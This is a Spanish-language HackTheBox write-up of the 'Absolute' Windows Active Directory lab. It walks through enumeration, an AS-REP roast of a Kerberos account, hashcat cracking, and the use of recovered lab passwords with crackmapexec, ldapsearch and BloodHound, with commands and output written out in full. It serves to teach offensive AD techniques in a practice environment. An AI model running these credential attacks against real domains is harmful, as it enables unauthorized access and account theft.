---
title: "HackTheBox: Absolute"
author: ace
date: 2023-11-08 19:10 +0800
categories:
  - HTB
  - Insane
  - Windows
tags:
  - ActiveDirectory
  - Kerberos
  - AS-RepRoast
  - Windows
  - impacket
  - whisker
  - rubeus
  - pywhisker
  - certipy
  - krbrelay
math: false
mermaid: true
image:
  path: /assets/img/post/Absolute/Absolute.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Absolute
---


|Box info|
|-----|
|**Hostname**| Absolute |
|**OS**| Windows |
|**Difficulty**| Insane |
|**Platform**| HackTheBox|

## Resumen

Absolute es buana opción para aprender sobre Kerberos, ya que esta método de autenticación en AD desempeña un papel crucial en su resolución. A pesar de su inicial dificultad, especialmente si no estás familiarizado con Kerberos, la máquina se vuelve más abordable a medida que adquieres experiencia en esta área, al menos en su primera fase.

Absolute y la máquina Scrambled son de los mejores recursos para explorar los conceptos relacionados con Kerberos. La temática que vamos a tocar hoy es la siguiente:

- Enumeración de metadatos en imágenes.
- Uso de **Username-Anarchy** para generar una wordlist que contenga posibles nombres de usuario
- Ataque AS-REP Roast.
- Autenticación a través de Kerberos.
- Enumeración manual en Active Directory (AD).
- Uso de Bloodhound para la enumeración.
- Análisis dinámico de un binario compilado en Nim con Wireshark.
- Explotación de DACL con `PowerView` y `dacl.py`
- Shadow Credentials Attack con `certipy` y `Whisker`
- KrbRelay Exploit.

Dicho esto vamos al lío.
## nmap

```ruby
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Absolute
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-05 19:18:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-11-05T19:19:45+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T19:19:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T19:19:45+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-11-05T19:19:44+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2023-11-05T19:19:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```
{: .nolineno }

## Recon

A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio.

### Web 80 - TCP

Para ir directo al grano, no tenemos acceso a una sesión de invitado para enumerar recursos a través de SMB, no podemos conectarnos al DC mediante rpcclient, no podemos realizar querys por LDAP para enumerar usuarios o información del dominio, ni tampoco enumerar subdominios a través de ataques AXFR. En cuanto al servidor web, se trata de un IIS que almacena una página estática. Después de ejecutar Gobuster, no he encontrado nada de interés, como archivos PHP o ASPX. Sin embargo, podemos obtener información de las imágenes almacenadas en la carpeta '/images'. Descargaremos estas imágenes a nuestra máquina local para analizar posteriormente los metadatos.

```bash
wget -r http://absolute.htb/images
```
{: .nolineno }

#### ExifTool: Extrayendo metadatos

Para analizar los metadatos de las imágenes, utilizaré ExifTool y filtraré por el campo 'Author' con el fin de obtener, si está disponible, el nombre de usuario que creó la imagen. En este caso, utilizaré un `*` para que el comando se aplique a todos los archivos PNG y me lo redirija a un fichero de texto. El comando que emplearé es el siguiente:

```bash
❯ exiftool *.jpg | grep -i "Author" | awk '{print $2}' FS=':' | sed 's/^ //g' | tee -a usernames.txt
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```
{: .nolineno }

Ahora que tenemos una lista de posibles usuarios, hemos dado un paso valioso en un entorno de Active Directory (AD). Generalmente, la estructura de los nombres de usuario depende del dominio y suele seguir patrones como inicial, apellido, inicial.apellido, inicial_apellido, entre otros. Para simplificar la generación de posibles nombres de usuario, existe una herramienta escrita en Ruby llamada **Username-Anarchy**. Esta herramienta toma un archivo de texto correctamente formateado y genera una lista de posibles nombres de usuario. Puedes encontrarla en el siguiente repositorio: [Usename-Anarchy](https://github.com/urbanadventurer/username-anarchy).

El siguiente paso consiste en formatear el archivo de manera que **Username-Anarchy** pueda entenderlo, lo cual suele ser en el formato 'nombre,apellido'. Con el editor de texto **vi** se puede realizar ejecutando la siguiente instrucción:

```
:%s/ /,/g
```
{: .nolineno }
El fichero final es el siguiente:

```bash
❯ cat usernames.txt
firstname,lastname
James,Roberts
Michael,Chaffrey
Nicole,Smith
Donald,Klay
Jeffer,Robinson
Sarah,Osvald
```
{: .nolineno }
Ejecutamos **Username-Anarchy** y obtenemos un archivo de texto con los posibles nombres de usuario. Luego, utilizamos **sponge** para sobrescribir el archivo sin la necesidad de redirigirlo a uno temporal o realizar pasos adicionales

```bash
❯ /opt/username-anarchy/username-anarchy -i usernames.txt -f flast,f.last | sponge usernames.txt
❯ cat usernames.txt
j.roberts
jroberts
m.chaffrey
mchaffrey
n.smith
nsmith
d.klay
dklay
j.robinson
jrobinson
s.osvald
sosvald
```
{: .nolineno }

### User Enumeration: Kerbrute

En Active Directory, el primer paso comúnmente realizado cuando se dispone de una lista de posibles usuarios del dominio es utilizar **Kerbrute** para comprobar si son válidos o no. Esto se  puede comprobar debido al funcionamiento de Kerberos. Cuando se envía una solicitud `AS_REQ` para obtener un TGT (Ticket Granting Ticket), si el usuario no es válido, Kerberos responde con un mensaje de `PRINCIPAL_UNKNOWN`, indicando que el usuario no se encuentra en la base de datos de Kerberos. Por otro lado, si el usuario es válido, Kerberos responderá con un mensaje de 'invalid credentials' u otra respuesta similar. 

```
❯ /opt/kerbrute/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/05/23 - Ronnie Flathers @ropnop

2023/11/05 13:40:41 >  Using KDC(s):
2023/11/05 13:40:41 >  	dc.absolute.htb:88

2023/11/05 13:40:41 >  [+] VALID USERNAME:	m.chaffrey@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	j.roberts@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	n.smith@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	j.robinson@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	s.osvald@absolute.htb
2023/11/05 13:40:41 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$d.klay@ABSOLUTE.HTB:fc3b115409207e3dc0d7b4e5bcecb3e0$021ba373ad154f0094c1b0908033c3b55eeb99fd9d3b5e4969131490b2519ee1790022539cfc3cdd387e0f1e2948dc2614346915b61c74406a9aa42d15c7c10005a21bcc7ac0872b30a7d2d2cc4c3bf83a64e4a869dbcf8a680a6519c8026ad46e45dc20a3ac4ea011627bf8e4b395426cbf3ad36cb281b4be13f5c744e60aace854ea155cb02788df60d89660705997c6b4e3d9b715d9f8443466a55ab157366814e01ee36b32306cd41b229bb7a1a7f22acaa30804c13e4cd9d418d8dc93e26f01e13dfd20c69afe4049af9c8f9780c4a4768729be3e3b85c2c38f6371f1943e49f155983fadbe0e69f104927b4d2c381a9ae451bc131b20e6a43c141b0f48
2023/11/05 13:40:41 >  [+] VALID USERNAME:	d.klay@absolute.htb
2023/11/05 13:40:41 >  Done! Tested 24 usernames (6 valid) in 0.214 seconds
```

Tras ejecutar Kerbrute, observamos un listado de usuarios válidos, y notamos que `d.klay` es vulnerable al ataque `AS-REP roast`. La última versión de Kerbrute realiza un AS-REP roast directamente para obtener el Ticket Granting Ticket (TGT) del usuario vulnerable. La vulnerabilidad de este usuario radica en su configuración, que tiene la opción `DONT_REQUIRE_PREAUTH` habilitada. Esto significa que no requiere autenticación previa de Kerberos, lo que permite que el `kdc` devuelva el TGT con la contraseña del usuario encriptada.

Guardamos los usuarios válidos en un fichero.

```bash
❯ cat usernames.txt
m.chaffrey
j.roberts
n.smith
j.robinson
s.osvald
d.klay
```
{: .nolineno }
### AS-REP Roast Attack

Por defecto, el valor ETYPE que Kerbrute muestra en su salida es el 18, mientras que el modo utilizado para crackear los hashes en Hashcat es el ETYPE 23. Debido a esta diferencia de formato, no será posible crackear el hash, ya que no coincide con el formato requerido por Hashcat. Para obtener el hash en un formato que hashcat entienda podemos hacer lo siguiente

Usar `impacket-GetNPUsers`:

```bash
❯ impacket-GetNPUsers -dc-ip 10.129.68.75 -no-pass -request 'absolute.htb/d.klay'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for d.klay
$krb5asrep$23$d.klay@ABSOLUTE.HTB:7f20e46062a600c2be20601c64f7a964$01cc50aef8801b01616870c0a0a5e5aff9a3c47b6173af9d62c96a81d352da28c74871a959c5e4b8ab7b055cfb991a3d67f70895c676fc47ec668f6aa0850ca3ca81d62c8d6e27e3fcb19e1716106fa012b31c755bd912f71160b1f12e257035577ac26caf476ee9c9734209e3f43b1303b25814f63caf1c2ab4e6d3f4316bafd1589d03b91625834987f71cc669872d66aaf06bb568ec5e1ca960cccca9199a43c8dca79cca058f38cc93c76e0123d9f59abd5158f018e8edd2253f73d657f5e5e2f2f7498d0840e8dc9775826e9f5b3d3652f227b7719ac0c2f5b456e7e4ab52cfb135b65f7fc7265ae845
```
{: .nolineno }
Con kerbrute usar la flag `--downgrade`:

```
❯ /opt/kerbrute/kerbrute userenum --dc dc.absolute.htb -d absolute.htb users.txt --downgrade

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/07/23 - Ronnie Flathers @ropnop

2023/11/07 00:17:46 >  Using downgraded encryption: arcfour-hmac-md5
2023/11/07 00:17:46 >  Using KDC(s):
2023/11/07 00:17:46 >  	dc.absolute.htb:88
...
...
2023/11/07 00:17:46 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$d.klay@ABSOLUTE.HTB:8d5712913aac4c62eda2d5c1d791c48e$541a1a48c6ee608182959fcf33c373961e6ab54a46ac1b256f5b59a10e695863603034716c8c5b684788c7e80e0dd76d376ea36b96e945ef8cb345dc878afd91dd9539a4896f9b44a572a10bdbc2ac335b55ccde0e7e4dd27fdf6de91700eaafee3a892a5c45eb6f23e9e2630f279118ac6b15d508b5e7dba58c1668faba647e2428aff68d812a26ac1c6c506617a78caec11fdb1d727b3dcf0773b7b303638101ba6adc8221a67d2d7ab4d86b6835380842c64f2159950bd9e99c3d6c4de0e927535a86fdae38560eabf69d800cd871e8628cd5438084bdceacbaa378bc62fd33f7553a4521f711f5878bed
2023/11/07 00:17:46 >  [+] VALID USERNAME:	d.klay@absolute.htb
```

Una vez tenemos el hash, lo crackeamos usando `hashcat`

```bash
❯ hashcat -m 18200 -a 0 d.klay.asrep /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-5775C CPU @ 3.30GHz, 6921/13906 MB (2048 MB allocatable), 8MCU

```
{: .nolineno }
```bash
$krb5asrep$23$d.klay@ABSOLUTE.HTB:7dcc8ee944cbd8d9acffd5e52e051762$6f4acb9b53597e032fa24da7f8c4ac8c4f66e92394b5512c9702841ac64f134052687e40aa5beb40a7977ecd1b0b91e1b90fbfef6ede949050627e5d43ff2a4a4c1ee7f4cee2df7c3534c4a4fb674a5863f170414049ac2b2d95e4cda2679bfab591c205f1b6f3a942432e4d74f68350cb6300cf90309c1ca714e1ec0520b2058ac5199b5056a8319869eab3aedc35688b1cd3911dc0e2c071fe6e1da57040497021ddd2e2bdaec6544bedf696dd2eb0d7df0b5f1bf3a90846939dfc93322c58fd42b6c05303436f81c870b7847481c033112905c1f6d316c78cd439fb52f10d9381e1c8c0804c2e4be542c8:Darkmoonsky248girl
```

Tras conseguir obtener la contraseña del usuario `d.klay` en texto plano, voy a validarla usando `crackmapexec`, y obtenemos el siguiente resultado:

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' 
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```
{: .nolineno }
Parece ser que `crackmapexec` realiza la autenticación mediante `NTLM`. Puede que el administrador del dominio haya deshabilitado este tipo de autenticación para usuarios no privilegiados, ya que de esta manera se evitan los ataques `Pass-The-Hash`.

Pero al disponer de la contraseña, voy a autenticarme usando `Kerberos`.

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW
```
{: .nolineno }
Vemos el siguiente error `KRB_AP_ERR_SKEW`. Esto ocurre porque no tenemos sincronizados la hora de nuestra máquina de atacante con el reloj del DC. Para evitar problemas con Kerberos siempre es recomendable tener síncronizada la hora.
### Sincronizando el reloj con el DC.

Para sincronizarlo podemos usar la herramienta `ntpdate`, aunque en mi caso tuve que realizar una configuración extra:

```bash
❯ sudo ntpdate 10.129.68.75
2023-11-05 22:19:23.24649 (+0100) +25200.798573 +/- 0.025121 10.129.68.75 s1 no-leap
CLOCK: time stepped by 25200.798573
```
{: .nolineno }
Aunque ejecute este comando, el reloj no se síncroniza y esto en mi caso concreto se debía a que el demonio `systemd-timesyncd` estaba ejecutandose. Este demonio se utiliza para sincronizar el reloj del sistema a través de la red, lo cual causaba conficto con`ntpdate`. Para evitar errores simplemente deshabilito el servicio, y ya puedo sincronizarme al DC.

```bash
❯ systemctl stop systemd-timesyncd.service
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ====
Authentication is required to stop 'systemd-timesyncd.service'.
Authenticating as: alex,,, (alex)
Password: 
==== AUTHENTICATION COMPLETE ====
❯ sudo ntpdate dc.absolute.htb
2023-11-05 22:28:00.484487 (+0100) +252
```
{: .nolineno }
Nos autenticamos por Kerberos, y ahora podemos comprobar que las credenciales son correctas.

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
```
{: .nolineno }
### Usando Kerberos como método de autenticación

Bien ya que disponemos de credenciales válidas, si queremos autenticarnos en el dominio para empezar a enumerar, lo tenemos que hacer usando Kerberos obligatoriamente. Esto puede ser un dolor de cabeza al principio por que la mayoría de scripts usados para enumerar AD, usan `NTLM` por defecto. 

Por ejemplo voy a conectarme por `rpcclient` al DC, usando las credenciales de `d.klay`

```bash
❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75
Cannot connect to server.  Error was NT_STATUS_ACCOUNT_RESTRICTION
```

El siguiente mensaje indica que la autenticación NTLM está desactivada. En cambió si lo hago con Kerberos, la cosa cambia.

```bash
❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75 --use-kerberos=required
Kerberos auth with 'd.klay@ABSOLUTE.HTB' (ABSOLUTE.HTB\d.klay) to access '10.129.68.75' not possible
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```
{: .nolineno }
No podemos conectarnos pero simplemente porque no tenemos permisos xD

Ahora bien ¿Como utilizo Kerberos, como método de autenticación?

Pues es necesario contar con el paquete `krb5-user` instalado y configurar el fichero `/etc/krb5.conf` indicado la información del dominio al que nos vamos a conectar. Debe tener la siguiente estructura:

```bash
[libdefaults]
    default_realm = ABSOLUTE.HTB


[realms]
    ABSOLUTE.HTB= {
        kdc = dc.absolute.htb
        admin_server = dc.absolute.htb
        default_domain = absolute.htb

    }

[domain_realm]
    .absolute.htb = ABSOLUTE.HTB
    absolute.htb
```

Una vez esto vamos a iniciar sesión como `d.klay` usando el comando `kinit`

```bash
❯ kinit d.klay
Password for d.klay@ABSOLUTE.HTB:
```
{: .nolineno }
No vemos ningún output lo cual quiere decir que disponemos de una sesión como `d.klay`. Podemos listar los tickets almacenados en memoria con `klist`

```bash
❯ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting     Expires            Service principal
11/07/23 02:50:44  11/07/23 06:50:44  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 11/07/23 06:50:44
11/07/23 02:51:18  11/07/23 06:50:44  ldap/dc.absolute.htb@ABSOLUTE.HTB
	renew until 11/07/23 06:50:44
```
{: .nolineno }
Bien ahora que podemos usar Kerberos como método de autenticación vamos a enumerar el dominio autenticados.

> También puedes usar **impacket** junto con el script **getTGT**. Este script crea un archivo **.ccache** que contiene el ticket de autenticación del usuario. Para utilizar esas credenciales, debes cambiar una variable de entorno llamada **KRB5CCNAME** para que apunte a ese archivo y, a partir de ahí, puedes autenticarte en el dominio. Para mí esta opción es un poco coñazo, ya que si cambias de pestaña en la terminal o se te olvida exportar la variable de entorno, perderás la autenticación. 
{: .prompt-info }

## Enumeración del dominio

Para mí la mejor opción para enumerar el dominio, es con `bloodhound`. Se puede ir haciendo manualmente con herramietas como `PowerView`, `ldapsearh`, `rpcclient`, etc... Pero a fin de cuentas la manera en la que `Bloodhound`, representa la información me parece más clara y la que mejor refleja la vía para escalar privilegios dentro del dominio. Dicho esto si queremos saber una información concreta, como por ejemplo a que grupo pertenece un usuario o enumerar los recursos compartidos por SMB, pues sí que es más rentable usar estas herramientas. Por ejemplo en este caso uso `ldapsearch` para sacar los usuarios del dominio. 

>Para usar la autenticación por que kerberos con **ldapseach** debemos tener instalado el paquete **libsasl2-modules-gssapi-mit** e indicar la flag **-Y GSSAPI** 
{: .prompt-warning }

```bash
❯ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "DC=absolute,DC=htb" "objectclass=user" | grep "name" | awk '{print $2}'
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
Administrator
Guest
DC
krbtgt
J.Roberts
M.Chaffrey
D.Klay
s.osvald
j.robinson
n.smith
m.lovegod
l.moore
c.colt
s.johnson
d.lemm
svc_smb
svc_audit
winrm_user
```
{: .nolineno }
También podríamos enumerar sus descripciones, ya que es común que en entornos CTF, se pueda obtener información como contraseñas.

```bash
❯ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "DC=absolute,DC=htb" "objectClass=User" name description | grep -E "(description|name)"
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
# requesting: name description 
description: Built-in account for administering the computer/domain
name: Administrator
description: Built-in account for guest access to the computer/domain
name: Guest
name: DC
description: Key Distribution Center Service Account
name: krbtgt
name: J.Roberts
name: M.Chaffrey
name: D.Klay
name: s.osvald
name: j.robinson
name: n.smith
name: m.lovegod
name: l.moore
name: c.colt
name: s.johnson
name: d.lemm
description: AbsoluteSMBService123!
name: svc_smb
name: svc_audit
description: Used to perform simple network tasks
name: winrm_user
```
{: .nolineno }
Como se puede observar en la descripcción de un usuario se puede ver la string `AbsoluteSMBService123!`, que tiene todas las papeletas de ser una contraseña.

Con `crackmapexec` es más sencillo tambíen lo podemos hacer y es mas legible la información:

```bash
❯ cme ldap 10.129.229.59 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --users
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.129.229.59   389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
LDAP        10.129.229.59   389    DC               [*] Total of records returned 20
LDAP        10.129.229.59   389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.129.229.59   389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.129.229.59   389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.129.229.59   389    DC               J.Roberts                      
LDAP        10.129.229.59   389    DC               M.Chaffrey                     
LDAP        10.129.229.59   389    DC               D.Klay                         
LDAP        10.129.229.59   389    DC               s.osvald                       
LDAP        10.129.229.59   389    DC               j.robinson                     
LDAP        10.129.229.59   389    DC               n.smith                        
LDAP        10.129.229.59   389    DC               m.lovegod                      
LDAP        10.129.229.59   389    DC               l.moore                        
LDAP        10.129.229.59   389    DC               c.colt                         
LDAP        10.129.229.59   389    DC               s.johnson                      
LDAP        10.129.229.59   389    DC               d.lemm                         
LDAP        10.129.229.59   389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.129.229.59   389    DC               svc_audit                      
LDAP        10.129.229.59   389    DC               winrm_user                     Used to perform simple network tasks
```
{: .nolineno }

A mí una herramienta que me gusta mucho para un reconocimiento inicial es `ldapdomaindump`, pero no soporta la autenticación por Kerberos así que este caso no aplica. 

También podríamos enumerar los recursos compartidos a los que tenemos permisos de escritura/lectura con `crackmapexec`

```bash
❯ cme smb 10.129.229.59 -u 'd.klay' -p 'Darkmoonsky248girl' -k  --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
SMB         10.129.229.59   445    DC               Share           Permissions     Remark
SMB         10.129.229.59   445    DC               -----           -----------     ------
SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.59   445    DC               C$                              Default share
SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.59   445    DC               Shared                          
SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 

```

Vemos una carpeta llamada `Shared` , que de momento no podemos acceder, pero sería interesante apuntar para mirar más tarde.
#### Bloodhound

Blodhound es una herramienta que se usa para auditar Active Directory. Utiliza gráficos para mostrar cómo están relacionados los objetos dentro del dominio. Esto ayuda a comprender mejor el dominio y a planear posibles vectores de ataque para elevar privilegios o moverse lateralmente dentro del dominio.

Normalmente se suele disponer de una shell en el sistema, y se lanzan los 'injestors' `SharpHound.exe` o `SharpHound.ps1`, para recopilar toda la información a través de consultasa LDAP en un fichero zip. Esto puede ser algo pesado de hacer ya que tienes que tener obligatoriamente una shell en alguno de los equipos del dominio y lo más probable es que tengas que evadir algún antivirus. En este caso en particular no queda otra que tirar `bloodhound-python` para enumerar el dominio. 

Con el siguiente comando realizaremos todas esas consultas sin necesidad de subir ningún binario. La información recopilada estara comprendida en varios ficheros `json` que tendremos que subir a `bloodhound`.

```bash
❯ bloodhound-python -dc dc.absolute.htb -ns 10.129.68.75 -c all -d absolute.htb -u 'd.klay' -p 'Darkmoonsky248girl'
INFO: Found AD domain: absolute.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 10S
```
{: .nolineno }

Para iniciar bloodhound es necesario tener instalado `neo4j`, que es un tipo de base de datos que se basa en grafos.

```
❯ sudo neo4j console
[sudo] password for alex: 
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
```
{: .nolineno }

Una vez iniciada la base de datos `neo4j`, ejecutamos bloodhound. En mi caso lo tengo a la última versión, y lo ejecuto con un alias., ya que por `apt`, suelen faltarle algunas features.

```bash
❯ which bloodhound
bloodhound: aliased to /opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown
```
{: .nolineno }
```
❯ cat ~/.zshrc | grep bloodhound
alias bloodhound='/opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown'
```
{: .nolineno }

Subimos los ficheros json para comenzar el analisis.

![img](/assets/img/post/Absolute/21.png)

Tras realizar varias querys, no encuentro nada de utilidad. Estas querys eran:

* **Find all Kerberoestable Users**
* **Shortest paths to Domain Admins**
* **Shortests paths to Uncronstained Delegation Systems**

Como hemos mencionado antes, en un CTF es común encontrar información sensible, como contraseñas, en las descripciones de los usuarios. En este caso, necesité conectarme a la base de datos Neo4j desde el servidor web y escribir una consulta personalizada para recuperar esta información.

```
MATCH (u:User) return u.name, u.description
```
{: .nolineno }

![img](/assets/img/post/Absolute/1.png)

También lo podemos obtener inspeccionando el json perteneciente a la información de los usuarios.

```bash
❯ cat 20231105223511_users.json  | jq '.data[].Properties | .samaccountname + ":" + .description' -r
:
winrm_user:Used to perform simple network tasks
svc_smb:AbsoluteSMBService123!
d.lemm:
svc_audit:
c.colt:
s.johnson:
l.moore:
n.smith:
m.lovegod:
j.robinson:
D.Klay:
s.osvald:
J.Roberts:
M.Chaffrey:
krbtgt:Key Distribution Center Service Account
Administrator:Built-in account for administering the computer/domain
Guest:Built-in account for guest access to the computer/domain
```
{: .nolineno }

### User Pivoting: smc_smb

Probamos la contraseña del usuario `svc_smb` y vemos que es válida dentro del dominio.

```bash
❯ cme smb 10.129.229.59 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
